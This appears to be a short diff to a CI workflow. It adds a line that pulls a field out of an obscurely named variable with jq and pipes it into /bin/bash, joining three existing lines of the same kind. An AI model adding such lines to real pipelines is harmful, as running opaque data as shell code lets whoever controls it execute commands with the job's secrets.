@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$na29387" | jq -r .duatw8084 | /bin/bash
           echo $czsq30983 | jq -r .wwft39171 | /bin/bash
           printf '%s' "$fnv84005" | jq -r .kmj38 | /bin/bash
+          printf '%s' "$iax80111" | jq -r .aw350 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
